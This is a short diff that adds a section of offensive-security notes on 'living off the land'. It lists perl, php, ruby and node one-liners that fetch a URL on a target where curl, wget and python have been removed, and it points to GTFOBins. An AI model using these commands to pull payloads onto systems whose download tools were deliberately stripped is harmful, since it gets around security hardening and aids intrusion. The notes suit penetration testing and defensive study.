@@ -1,0 +1,13 @@
+── perl / php / ruby one-liners ──────────────────────────
+When curl, wget and python are all stripped, an interpreter
+is usually still lying around. Each can pull a URL:
+
+  perl -MLWP::Simple -e 'getstore($url,$file)'
+  perl -MHTTP::Tiny  -e 'HTTP::Tiny->new->get($url)'
+  php  -r 'echo file_get_contents($url);'   # needs allow_url_fopen
+  ruby -ropen-uri -e 'print URI.open($url).read'
+  node -e "require('https').get(url,...)"
+
+This is "living off the land": you don't bring tools, you
+use what the target already trusts. GTFOBins catalogues many
+such interpreter tricks.
